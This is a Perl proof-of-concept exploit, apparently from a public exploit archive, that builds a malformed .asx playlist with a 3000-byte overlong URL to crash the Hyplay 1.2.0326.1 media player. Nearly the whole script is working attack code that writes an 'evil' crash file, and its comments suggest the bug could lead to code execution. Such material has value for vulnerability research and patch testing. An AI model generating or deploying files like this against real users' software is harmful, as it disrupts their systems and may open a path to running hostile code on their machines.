#/usr/bin/perl
#Title: Hyplay 1.2.0326.1 (.asx) Local DoS crash PoC
#Download: http://www.hyplay.com/download.asp
#Written/Discovered by: xsploited Security
#Tested on Windows XP SP2
#URL: http://x-sploited.com/
#Shoutz: kAoTiX, drizzle, JeremyBrown, BreTT, Deca
 
#A bug exists in the way Hyplay processes malformed .asx play
#list files. This could potentially lead to code execution on
#the users machine.
 
my $data1=  
"\x3C\x61\x73\x78\x20\x76\x65\x72\x73\x69\x6F\x6E\x20\x3D\x20".
"\x22\x33\x2E\x30\x22\x20\x3E\x0D\x0D\x0A\x3C\x65\x6E\x74\x72".
"\x79\x3E\x0D\x0D\x0A".
"\x3C\x72\x65\x66\x20\x68\x72\x65\x66\x20\x3D\x20\x22";
 
my $data2="http://";
 
my $data3= #asx file footer
"\x22\x20\x2F\x3E\x0D\x0A\x3C\x2F\x65\x6E\x74\x72\x79\x3E\x0D".
"\x0A\x3C\x2F\x61\x73\x78\x3E";
 
my $junk = "\x41" x 3000;
open(my $playlist, "> hyplay_d0s.asx");
print $playlist $data1.$data2.$junk.$data3."\r\n";
close $playlist;
print "\nEvil asx file created successfully.";